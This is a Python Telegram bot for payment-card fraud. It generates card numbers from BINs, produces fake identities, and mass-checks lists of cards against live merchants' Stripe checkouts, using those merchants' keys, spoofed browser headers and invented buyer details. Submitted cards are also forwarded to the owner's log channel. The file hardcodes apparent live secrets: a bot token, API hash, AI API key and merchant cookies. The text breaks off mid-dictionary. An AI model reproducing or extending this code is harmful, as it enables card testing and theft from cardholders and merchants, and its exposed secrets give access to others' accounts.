import os
import logging
import requests
import json
from urllib.parse import urlencode
import re
import time
import random
import requests
import asyncio
from pyrogram import Client, filters, idle
from pyrogram.types import Message
from pyrogram.enums import ChatAction, ParseMode

# === CONFIG ===
API_ID = 22118129
API_HASH = "43c66e3314921552d9330a4b05b18800"
BOT_TOKEN = "7252664374:AAG-DTJZN5WUQRTZd7yLrDCEIlrYZJ6xxGw"
GEMINI_API_KEY = "AIzaSyBcoZN2N2TKJeaWExZG9vT7hYU7K1--Tgw"
BOT_OWNER = "@andr0idpie9"
LOG_CHANNEL_ID = -1002843745742
GATEWAY_NAME = "Stripe Auth"
GATEWAY_URL_TEMPLATE = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={}"
BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
CC_REGEX = r"/chk (\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4})"
OWNER_ID = 5203820046

# === Logging Setup ===
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# === Initialize Bot ===
app = Client(
    "CombinedBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# === Ping Message ===
PING_MESSAGE = """
`⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤
⠀⠀⠀⠐⠋⠀⠀⠙⢿⣿⡆⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⣠⣶⣾⣿⣿⣿⣿⡇
⣠⠴⣶⣤⣀⡀⠀⣠⣿⣿⠏⠀⠀⣿⡇⠀⣿⡏⢸⣿⠀⠀⣿⡇
⠀⠀⠈⠻⣿⣿⣟⠛⠋⠁⠀⠀⠀⣿⡇⠀⠹⣷⣼⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠈⠻⣿⣷⣄⠀⠀⠀⠀⠿⠷⠀⠀⠉⠛⠉⠀⠀⠿⠿
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢴⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣦⣀⠀⠀⠀⠀⢀⣼⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠉

⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤
⠀⠀⠀⠐⠋⠀⠀⠙⢿⣿⡆⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⣠⣶⣾⣿⣿⣿⣿⡇
⣠⠴⣶⣤⣀⡀⠀⣠⣿⣿⠏⠀⠀⣿⡇⠀⣿⡏⢸⣿⠀⠀⣿⡇
⠀⠀⠈⠻⣿⣿⣟⠛⠋⠁⠀⠀⠀⣿⡇⠀⠹⣷⣼⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠈⠻⣿⣷⣄⠀⠀⠀⠀⠿⠷⠀⠀⠉⠛⠉⠀⠀⠿⠿
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢴⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣦⣀⠀⠀⠀⠀⢀⣼⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠉` 
"""

# === Background Task for Ping ===
async def ping_owner():
    while True:
        try:
            await app.send_message(OWNER_ID, PING_MESSAGE)
            logging.info("Ping message sent to owner")
        except Exception as e:
            logging.error(f"Failed to send ping: {e}")
        await asyncio.sleep(300)  # 5 minutes = 300 seconds

def random_string(length):
    """Generate a random lowercase string of specified length"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

# === Gemini Flash API Function ===
def get_gemini_flash_response(prompt: str) -> str:
    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
    headers = {
        "Content-Type": "application/json",
        "X-goog-api-key": GEMINI_API_KEY
    }
    payload = {
        "contents": [
            {
                "parts": [{"text": prompt}]
            }
        ]
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        return data["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        logging.error(f"Gemini API Error: {e}")
        return "⚠️SYSTEM PE LOAD HAI BHAI!"

# === Split long responses ===
def split_response(text: str, max_len=4000):
    parts = []
    while len(text) > max_len:
        split_at = text.rfind("\n", 0, max_len)
        if split_at == -1:
            split_at = max_len
        parts.append(text[:split_at])
        text = text[split_at:].lstrip()
    parts.append(text)
    return parts

# === BIN Info Function ===
def get_bin_info(bin_code):
    try:
        response = requests.get(BIN_API_URL.format(bin_code), timeout=10)
        if response.status_code != 200:
            return "Unknown", "Unknown", "N/A"

        data = response.json()
        brand = data.get("brand", "Unknown")
        bank = data.get("bank", "Unknown")
        country = data.get("country_name", "Unknown")
        flag = data.get("country_flag", "")

        return brand, bank, f"{country} {flag}" if country != "Unknown" else "N/A"

    except Exception as e:
        logging.error(f"BIN lookup error: {e}")
        return "Unknown", "Unknown", "N/A"

# === Generate CC Function ===
def generate_cc(bin_code, count=10):
    if count > 100:
        count = 100
    elif count < 1:
        count = 1
        
    cc_list = []
    for _ in range(count):
        # Generate random card number (bin + 10 digits)
        card_number = bin_code + ''.join([str(random.randint(0, 9)) for _ in range(10)])
        
        # Generate random expiry (month between 1-12, year between current year + 1 to +10)
        month = str(random.randint(1, 12)).zfill(2)
        year = str(random.randint(time.localtime().tm_year + 1, time.localtime().tm_year + 10))
        
        # Generate random 3-digit CVV
        cvv = str(random.randint(100, 999))
        
        cc_list.append(f"<code>{card_number}|{month}|{year}|{cvv}</code>")
    
    return cc_list

# === Log to Channel Function ===
async def log_to_channel(client: Client, log_type: str, message: Message, content: str, result: str = None):
    try:
        user = message.from_user
        user_info = f"[{user.first_name}](tg://user?id={user.id}) (`{user.id}`)"
        chat_type = message.chat.type.name
        
        if log_type == "AI":
            log_text = (
                f"📝 **New AI Prompt** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Prompt:** `{content}`\n"
                f"**AI Response:**\n{result}"
            )
        elif log_type == "CC":
            log_text = (
                f"💳 **New CC Check** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Card:** `{content}`\n"
                f"**Result:** {result}"
            )
        elif log_type == "GEN":
            log_text = (
                f"🔄 **New CC Generation** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**BIN:** `{content}`\n"
                f"**Count:** {result}"
            )
        
        await client.send_message(LOG_CHANNEL_ID, log_text)
    except Exception as e:
        logging.warning(f"Failed to log message: {e}")

# === AI Handler ===
@app.on_message(filters.text & filters.command("ai", prefixes="/"))
async def ai_handler(client: Client, message: Message):
    user_input = message.text[len("/ai"):].strip()
    if not user_input:
        await message.reply("❗ Please provide a prompt after `/ai`.")
        return

    await client.send_chat_action(message.chat.id, ChatAction.TYPING)
    thinking_msg = await message.reply("🧠 *Thinking...*", quote=True)

    # Get AI response
    ai_response = get_gemini_flash_response(user_input)
    parts = split_response(ai_response)

    # Send response
    try:
        if len(parts) == 1:
            final_text = f"{parts[0]}\n\n✨ Powered by {BOT_OWNER}"
            await thinking_msg.edit(final_text)
        else:
            await thinking_msg.edit(parts[0])
            for part in parts[1:-1]:
                await message.reply(part)
            await message.reply(f"{parts[-1]}\n\n✨ Powered by {BOT_OWNER}")
    except Exception as e:
        logging.error(f"Edit/send failed: {e}")
        await message.reply("⚠️ Failed to send AI response.")

    # Log to channel
    await log_to_channel(client, "AI", message, user_input, ai_response)

# === CC Check Handler ===
# === CC Generator Handler ===
@app.on_message(filters.command("gen", prefixes="/"))
async def generate_cc_handler(client: Client, message: Message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            await message.reply("❗ Please provide a BIN after <code>/gen</code>\nExample: <code>/gen 511253</code> or <code>/gen 511253 5</code>", parse_mode=ParseMode.HTML)
            return

        bin_code = parts[1]
        if not bin_code.isdigit() or len(bin_code) < 6:
            await message.reply("❗ Invalid BIN. Must be at least 6 digits.")
            return

        # Get count if provided
        count = 10  # default
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 1000:
                    count = 50
                    await message.reply("⚠️ Maximum count is 50. Generating 50 CCs.")
                elif count < 1:
                    count = 1
            except ValueError:
                await message.reply("❗ Invalid count. Using default 10 CCs.")

        # Show generating message
        proc_msg = await message.reply(f"🔹 Generating {count} CCs...")

        # Generate CCs
        cc_list = generate_cc(bin_code[:6], count)

        # Get BIN info
        brand, bank, country = get_bin_info(bin_code[:6])

        # Format response
        cc_text = "\n".join(cc_list)
        response_text = (
            f"<b>Generated {count} CCs 💳</b>\n\n"
            f"{cc_text}\n\n"
            f"<b>BIN-LOOKUP</b>\n"
            f"• BIN ➳ <code>{bin_code[:6]}</code>\n"
            f"• Country ➳ {country}\n"
            f"• Type ➳ {brand}\n"
            f"• Bank ➳ {bank}\n\n"
            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
        )

        await proc_msg.edit(response_text, parse_mode=ParseMode.HTML)
        
        # Log to channel
        await log_to_channel(client, "GEN", message, bin_code[:6], count)

    except Exception as e:
        logging.error(f"CC generation error: {e}")
        await message.reply(f"❌ Error generating CCs: {str(e)}")

# === Start Handler ===
@app.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    welcome_msg = f"""
🌟 **Welcome to {GATEWAY_NAME} Bot** 🌟

⚡ **A Multi-Purpose Bot with Powerful Features:**

✓ **AI Assistant** - Get smart responses with `/ai <your query>`
✓ **CC Checker** - Validate cards with `/chk <card details>`
✓ **CC Generator** - Generate test cards with `/gen <BIN>`

🔹 **Example Commands:**
- `/ai explain quantum computing`
- `/chk 4111111111111111|12|2025|123`
- `/gen 511253 5` (generates 5 cards with BIN 511253)

📌 **Bot Features:**
- Fast and reliable
- Secure processing
- Detailed responses

👨‍💻 **Developer:** {BOT_OWNER}
🛠 **Support:** Contact dev for issues

🔥 **Start exploring by sending a command above!** 🔥
"""
    await message.reply(welcome_msg, parse_mode=ParseMode.MARKDOWN)

# === Startup Task ===
async def startup_task():
    # Start the ping task when bot starts
    asyncio.create_task(ping_owner())

# === Main Function ===
async def main():
    await app.start()
    await startup_task()
    await idle()
    
@app.on_message(filters.command("mgen", prefixes="/"))
async def mass_cc_generator(client: Client, message: Message):
    try:
        # Parse command arguments
        parts = message.text.split()
        if len(parts) < 2:
            await message.reply("❗ Please provide a BIN after `/mgen`\nExample: `/mgen 541174` or `/mgen 541174 500`")
            return

        bin_code = parts[1]
        if not bin_code.isdigit() or len(bin_code) < 6:
            await message.reply("❗ Invalid BIN. Must be at least 6 digits.")
            return

        # Get count if provided (default 100, max 10000)
        count = 100
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 10000:
                    count = 10000
                    await message.reply("⚠️ Maximum count is 10,000. Generating 10K CCs.")
                elif count < 1:
                    count = 100
            except ValueError:
                await message.reply("❗ Invalid count. Using default 100 CCs.")

        # Show generating message (will be deleted later)
        proc_msg = await message.reply(f"🔹 Generating {count} CCs via API... This may take a while for large counts.")

        # Call the API
        api_url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_code}&count={count}"
        response = requests.get(api_url, timeout=60)
        
        if response.status_code != 200:
            await proc_msg.edit(f"❌ API Error: Status code {response.status_code}")
            return

        cc_list = response.text.splitlines()
        if not cc_list:
            await proc_msg.edit("❌ No CCs generated. API returned empty response.")
            return

        # Get BIN info
        brand, bank, country = get_bin_info(bin_code[:6])

        # Create filename
        username = message.from_user.username or str(message.from_user.id)
        filename = f"ccgen_{bin_code[:6]}by@{username}.txt"

        # Prepare file content (just the CCs, no headers)
        file_content = "\n".join(cc_list)

        # Save to file
        with open(filename, "w") as f:
            f.write(file_content)

        # Prepare caption with BIN info
        caption = (
            f"Generated {count} CCs 💳\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"BIN ➳ {bin_code[:6]}\n"
            f"Country ➳ {country}\n"
            f"Type ➳ {brand}\n"
            f"Bank ➳ {bank}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )

        # Send document and delete processing message
        await message.reply_document(
            document=filename,
            caption=caption,
            quote=True
        )
        await proc_msg.delete()

        # Delete the file
        import os
        os.remove(filename)

    except Exception as e:
        # If there was an error but file was uploaded, don't show error
        if 'filename' in locals() and os.path.exists(filename):
            await proc_msg.delete()
        else:
            logging.error(f"Mass CC generation error: {e}")
            await message.reply(f"❌ Error generating CCs: {str(e)}")    
        
@app.on_message(filters.command("fake", prefixes="/"))
async def fake_identity_generator(client: Client, message: Message):
    try:
        # Default country is US if not specified
        country = "us"
        parts = message.text.split()
        if len(parts) > 1:
            country = parts[1].lower()

        # Show generating message
        proc_msg = await message.reply("🔹 Generating fake identity...")

        # Call the API
        api_url = f"https://randomuser.me/api/?nat={country}"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code != 200:
            await proc_msg.edit(f"❌ API Error: Status code {response.status_code}")
            return

        data = response.json().get("results", [{}])[0]
        
        # Extract all possible fields with fallbacks
        name = f"{data.get('name', {}).get('first', 'Unknown')} {data.get('name', {}).get('last', 'Unknown')}"
        street = f"{data.get('location', {}).get('street', {}).get('number', '')} {data.get('location', {}).get('street', {}).get('name', 'Unknown')}"
        city = data.get('location', {}).get('city', 'Unknown')
        state = data.get('location', {}).get('state', 'Unknown')
        country_full = data.get('location', {}).get('country', 'Unknown')
        postcode = data.get('location', {}).get('postcode', 'Unknown')
        email = data.get('email', 'Unknown')
        phone = data.get('phone', 'Unknown')
        cell = data.get('cell', 'Unknown')
        dob = data.get('dob', {}).get('date', 'Unknown')[:10]  # Just the date part
        login = data.get('login', {})
        username = login.get('username', 'Unknown')
        password = login.get('password', 'Unknown')
        id_info = data.get('id', {})
        ssn = id_info.get('value', 'N/A')
        picture = data.get('picture', {}).get('large', 'N/A')

        # Format the response
        response_text = (
            f"┏━━━━━━━⍟\n"
            f"┃ Fake Identity \n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"✧ Name      ➳ `{name}`\n"
            f"✧ Street    ➳ `{street}`\n"
            f"✧ City      ➳ `{city}`\n"
            f"✧ State     ➳ `{state}`\n"
            f"✧ Country   ➳ `{country_full}`\n"
            f"✧ ZIP Code  ➳ `{postcode}`\n\n"
            f"✧ Email     ➳ `{email}`\n"
            f"✧ Phone     ➳ `{phone}`\n"
            f"✧ Mobile    ➳ `{cell}`\n"
            f"✧ DOB       ➳ `{dob}`\n\n"
            f"✧ Username  ➳ `{username}`\n"
            f"✧ Password  ➳ `{password}`\n\n"
            f"✧ SSN/ID    ➳ `{ssn}`\n"
            f"✧ Photo URL ➳ {picture}\n\n"
            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
        )

        await proc_msg.edit(response_text, parse_mode=ParseMode.MARKDOWN)

    except Exception as e:
        logging.error(f"Fake identity generation error: {e}")
        await message.reply(f"❌ Error generating fake identity: {str(e)}")
# Add this handler to your script
@app.on_message(filters.command("txtchk") & filters.reply)
async def txt_chk_handler(client: Client, message: Message):
    try:
        # Check if replied message has a document
        if not message.reply_to_message.document:
            await message.reply("❗ Please reply to a text file with `/txtchk`")
            return

        # Check if file is txt
        if not message.reply_to_message.document.file_name.endswith('.txt'):
            await message.reply("❗ Please reply to a .txt file")
            return

        # Send initial processing message
        proc_msg = await message.reply("↯ Processing your file, please wait...")

        # Download the file
        file_path = await message.reply_to_message.download()
        
        # Read the file
        with open(file_path, 'r') as f:
            cc_lines = f.read().splitlines()

        # Remove empty lines and validate CC format
        valid_ccs = []
        for line in cc_lines:
            line = line.strip()
            if re.match(r"\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}", line):
                valid_ccs.append(line)

        total_ccs = len(valid_ccs)
        if total_ccs == 0:
            await proc_msg.edit("❌ No valid CCs found in the file.")
            os.remove(file_path)
            return

        # Initialize counters
        approved = 0
        declined = 0
        error = 0
        otp_required = 0
        start_time = time.time()
        last_update = time.time()
        
        # Prepare results list
        results = []
        results.append("Card Details                        | Status          | Response")
        results.append("------------------------------------|-----------------|-----------------")

        # Process each CC
        processed = 0
        for cc in valid_ccs:
            try:
                # Update progress every 5 seconds
                current_time = time.time()
                if current_time - last_update >= 5:
                    elapsed = current_time - start_time
                    eta = (elapsed / (processed + 1)) * (total_ccs - processed - 1)
                    
                    progress_msg = (
                        f"↯ Processing your file, please wait...\n\n"
                        f"✧ Total Cards: {total_ccs}\n"
                        f"✧ Checked: {processed}/{total_ccs}\n"
                        f"✧ Approved: {approved} ✅\n"
                        f"✧ Declined: {declined} ❌\n"
                        f"✧ OTP Required: {otp_required} 🔄\n"
                        f"✧ Errors: {error} ⚠️\n"
                        f"✧ ETA: {eta:.2f}s remaining"
                    )
                    
                    await proc_msg.edit(progress_msg)
                    last_update = current_time

                # Process the CC
                response = requests.get(GATEWAY_URL_TEMPLATE.format(cc), timeout=30)
                result_text = response.text.strip()
                status = "DECLINED ❌"
                
                if "declined" not in result_text.lower():
                    if "otp" in result_text.lower() or "3d" in result_text.lower():
                        status = "OTP REQUIRED 🔄"
                        otp_required += 1
                    else:
                        status = "APPROVED ✅"
                        approved += 1
                else:
                    declined += 1

                # Add to results
                results.append(f"{cc.ljust(35)}| {status.ljust(15)}| {result_text}")
                processed += 1

            except Exception as e:
                error += 1
                results.append(f"{cc.ljust(35)}| ERROR ⚠️       | {str(e)}")
                processed += 1
                continue

        # Final stats
        elapsed = time.time() - start_time
        
        # Save results to file
        username = message.from_user.username or str(message.from_user.id)
        result_filename = f"cc_check_results_{username}.txt"
        with open(result_filename, 'w') as f:
            f.write("\n".join(results))

        # Prepare caption
        caption = (
            f"─────── ⸙ ────────\n"
            f"↯ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n\n"
            f"✧ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {total_ccs}\n"
            f"✧ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : {GATEWAY_NAME}\n"
            f"✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 : {approved} ✅\n"
            f"✧ 𝗢𝗧𝗣 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 : {otp_required} 🔄\n"
            f"✧ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {declined} ❌\n"
            f"✧ 𝗘𝗿𝗿𝗼𝗿: {error} ⚠️\n"
            f"✧ 𝗧𝗶𝗺𝗲: {elapsed:.2f}s\n\n"
            f"↯ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: @{username}\n"
            f"─────── ⸙ ────────"
        )

        # Send results and clean up
        await message.reply_document(
            document=result_filename,
            caption=caption,
            quote=True
        )
        await proc_msg.delete()
        
        # Clean up files
        os.remove(file_path)
        os.remove(result_filename)

        # Log to channel
        log_text = (
            f"📁 **Mass CC Check Completed**\n"
            f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
            f"**File:** `{message.reply_to_message.document.file_name}`\n"
            f"**Total Cards:** {total_ccs}\n"
            f"**Approved:** {approved}\n"
            f"**Declined:** {declined}\n"
            f"**OTP Required:** {otp_required}\n"
            f"**Errors:** {error}\n"
            f"**Time Taken:** {elapsed:.2f}s"
        )
        await log_to_channel(client, "CC", message, f"File: {message.reply_to_message.document.file_name}", log_text)

    except Exception as e:
        logging.error(f"Mass CC check error: {e}")
        await message.reply(f"❌ Error processing file: {str(e)}")
        if 'proc_msg' in locals():
            await proc_msg.delete()
        if 'file_path' in locals() and os.path.exists(file_path):
            os.remove(file_path)
        if 'result_filename' in locals() and os.path.exists(result_filename):
            os.remove(result_filename)        
            
async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
    try:
        # Generate random user details
        zip_code = random.randint(10001, 90045)
        time_on_page = random.randint(30000, 699999)
        rand_num = random.randint(0, 99999)
        email = f"{random_string(7)}{rand_num}@gmail.com"
        first_name = random_string(7)
        last_name = random_string(7)
        
        # First request to get muid, sid, guid
        session = requests.Session()
        headers = {
            'Host': 'm.stripe.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://m.stripe.network',
            'Referer': 'https://m.stripe.network/inner.html'
        }
        
        res1 = session.get('https://m.stripe.com/6', headers=headers)
        muid = capture(res1.text, '"muid":"', '"')
        sid = capture(res1.text, '"sid":"', '"')
        guid = capture(res1.text, '"guid":"', '"')
        
        # Get BIN info
        bin_code = cc[:6]
        brand, bank, country = get_bin_info(bin_code)
        
        # Prepare payment method request
        headers = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
        }
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'billing_details[address][postal_code]': zip_code,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/c478317df; stripe-js-v3/c478317df',
            'time_on_page': time_on_page,
            'referrer': 'https://atlasvpn.com/',
            'key': 'pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf'
        }
        
        # Make payment method request
        start_time = time.time()
        res2 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        elapsed = time.time() - start_time
        
        if 'error' in res2.text.lower():
            error_msg = capture(res2.text, '"message": "', '"')
            status = "Dead ❌"
            response = error_msg
        else:
            payment_id = capture(res2.text, '"id": "', '"')
            
            # Make payment request
            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'Host': 'user.atlasvpn.com',
                'Origin': 'https://atlasvpn.com',
                'Referer': 'https://atlasvpn.com/',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
            }
            
            payload = {
                "email": email,
                "name": f"{first_name} {last_name}",
                "payment_method_id": payment_id,
                "identifier": "com.atlasvpn.vpn.subscription.p1m.stripe_regular_2",
                "currency": "USD",
                "postal_code": zip_code
            }
            
            res3 = session.post('https://user.atlasvpn.com/v1/stripe/pay', headers=headers, json=payload)
            
            if 'client_secret' in res3.text:
                status = "CVV or CCN ✅"
                response = "Approved"
            else:
                error_code = capture(res3.text, '"code":"', '"')
                status = "Dead ❌"
                response = error_code if error_code else "Declined"
        
        # Prepare plain text response (no HTML/Markdown)
        result_text = (
            f"Card: {cc}|{mes}|{ano}|{cvv}\n"
            f"Status: {status}\n"
            f"Response: {response}\n"
            f"Gateway: Stripe Auth 1\n"
            f"Time: {elapsed:.2f}s\n\n"
            f"------- Bin Info -------\n"
            f"Bank: {bank}\n"
            f"Brand: {brand}\n"
            f"Type: {country.split()[1] if len(country.split()) > 1 else 'N/A'}\n"
            f"Country: {country}\n"
            f"----------------------------\n\n"
            f"Checked By: {firstname} (ID: {user_id})\n"
            f"Bot By: ANDROID PIE (@andr0idpie9)"
        )
        
        return result_text
        
    except Exception as e:
        logging.error(f"Stripe checker error: {e}")
        return f"Error processing card: {str(e)}"

# Add this handler to your script
@app.on_message(filters.command("st", prefixes="/"))
async def stripe_check_handler(client: Client, message: Message):
    try:
        # Check if CC is provided
        if len(message.text.split()) < 2:
            await message.reply("❗ Please provide a CC in format: `/st 4147202658688666|02|29|206`")
            return

        # Extract CC details
        cc_details = message.text.split()[1]
        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", cc_details):
            await message.reply("❗ Invalid CC format. Use: `/st 4147202658688666|02|29|206`")
            return

        cc, mnt, yr, cvc = cc_details.split("|")
        
        # Send processing message
        proc_msg = await message.reply("↯ Checking card via Stripe [30$]...")

        start_time = time.time()
        
        # First request to get payment method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        }

        data = f'type=card&billing_details[name]=Habud+Kus&billing_details[address][city]=Lobe+&billing_details[address][country]=FI&billing_details[address][line1]=Rantakyl%C3%A4nkatu+2&billing_details[address][postal_code]=80160&billing_details[email]=gecodo9246%40mvpmedix.com&billing_details[phone]=013+2635544&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mnt}&card[exp_year]={yr}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F2e00b582bb%3B+stripe-js-v3%2F2e00b582bb%3B+split-card-element&referrer=https%3A%2F%2Fshop.dairlab.com&time_on_page=427267&client_attribution_metadata[client_session_id]=3f95b03a-1483-4628-9a69-2b624b78f3b5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51H70VWFJYq0SkRDBdQBb45H4LBKAsA8bzspunFznrztuwSML8mfbiALnUysBGvGfR0Iko3gCZKbzfIVTYmMJuUs500VwwmFMY8&_stripe_account=acct_1H70VWFJYq0SkRDB&_stripe_version=2022-08-01'

        try:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            op = response.json()
            
            if 'error' in op:
                # Handle error from first request
                elapsed = time.time() - start_time
                brand, bank, country = get_bin_info(cc[:6])
                
                # Log full response to channel
                await client.send_message(
                    LOG_CHANNEL_ID,
                    f"🔴 Stripe API Error Response:\n"
                    f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
                    f"Response: {response.text}\n"
                    f"Gateway: Stripe [30$]"
                )
                
                # Extract detailed error message
                error_message = op.get('error', {}).get('message', 'Unknown error')
                decline_code = op.get('error', {}).get('decline_code', '')
                
                result_text = (
                    f"┏━━━━━━━⍟\n"
                    f"┃ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n"
                    f"┗━━━━━━━━━━━⊛\n\n"
                    f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
                    f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe [30$] \n"
                    f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {error_message}\n\n"
                    f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
                    f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
                    f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
                    f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
                    f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
                    f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
                )
                
                await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)
                await log_to_channel(client, "CC", message, cc_details, f"Declined: {error_message}")
                return
            
            payment_id = op["id"]
            
            # Second request to process payment
            cookies = {
                '_ga': 'GA1.1.483482794.1753196710',
                'pys_first_visit': 'true',
                'pysTrafficSource': 'shop.dairlab.com',
                'pys_landing_page': 'https://shop.dairlab.com/en/shop/',
                'last_pysTrafficSource': 'shop.dairlab.com',
                '_fbp': 'fb.1.1753196719527.8870665683',
                'wp_woocommerce_session_9a2bba88407b1bc30c9ee7c85f22e029': 't_0d80916dd2246bac201b1e151b422a%7C%7C1753369553%7C%7C1753365953%7C%7C3a74820485066e64144375f1ac6eadbd',
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'a9ad4d74c641309b60ea53e0b35d1d02',
                'sbjs_migrations': '1418474375998%3D1',
